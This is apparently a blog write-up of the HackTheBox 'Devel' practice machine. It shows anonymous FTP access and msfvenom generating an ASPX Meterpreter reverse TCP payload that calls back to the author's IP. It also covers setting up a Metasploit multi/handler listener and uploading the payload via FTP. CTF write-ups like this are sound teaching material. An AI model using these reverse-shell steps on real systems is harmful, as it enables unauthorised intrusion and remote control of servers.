---
title: 'HachTheBox - Devel'
date: '2021-10-04 14:00:00 +0000'
categories: [HTB, easy]
tags: [hackthebox, easy]     # TAG names should always be lowercase
comments: true
mermaid: true
image:
  src: /assets/img/devel/devel.png
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: Legacy box logo icon
---


Firstly we begin with our NMAP scan. From our scan results we see that ports 21 (ftp) & 80 (http) are open. My first obvservation is that anonymous login is permitted on the FTP server.

![nmap-scan-results](/assets/img/devel/devel-nmap.png)

Before attempting to connect to FTP, I'd like to take a look at what the web server on port 80 is serving up so in a browser I navigate to "http://10.10.10.5". We see a default webpage for IIS Microsoft webserver. To save time I'll skip the step of running Dirbuster, which I would normally do at this point to see if I can bruteforce any hidden directories.

![iis-webpage](/assets/img/devel/iis7.png)

As the FTP server allows for anonymous login, my next step is to connect to it as I am going to attempt to upload a malicious file that I can execute via the web service. The anonymous login is successfull.

![iis-webpage](/assets/img/devel/ftp-in.png)

We're going to set up a listener via Metasploit, but first we need to upload a malicious file that will connect back to our listener. We navigate to this cheatsheet page "https://mytrickstuff.com/hacks-and-tricks/msfvenom-cheat-sheet-one-page-one-code/" in a browser. As we're dealing with a Microsoft webserver we need to locate the payload for the file type of ASP. Under Web Payloads we see the ASP Meterpreter Reverse TCP snippet - ```msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp```.

![iis-webpage](/assets/img/devel/cheatsheet.png)

We use the cheat sheet snippet with ```msfvenom``` to create the payload. Replacing LHOST with your tun0 IP. I also changed the file extension to ASPX, either ASP or ASPX will work, but make sure the file extension in the command and the extension of the file your putting it in a re the same. This will take a few seconds to generate. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx > ex.aspx```.

![iis-webpage](/assets/img/devel/venom.png)

We fire up Metasploit using ```msfconsole``` and enter ```use exploit/multi/handler``` to begin opening up a listener. 

![iis-webpage](/assets/img/devel/use-multi-handler.png)

We need to reconfigure the options. This requires setting the payload to the same as we used for the malicious reverse shell file we generated with ```msfvenom```. We also need to set the ```LHOST``` to the same IP as we used, which is the IP of our tun0 network interface. We enter ```run``` to start the listener.

![iis-webpage](/assets/img/devel/set-options-run.png)

Now we need to upload our malicious file. We connect to the FTP server with ```ftp 10.10.10.5```

![iis-webpage](/assets/img/devel/ftp-in.png)

And upload our file to the server with ```put ex.aspx```.

![iis-webpage](/assets/img/devel/ftp-in.png)











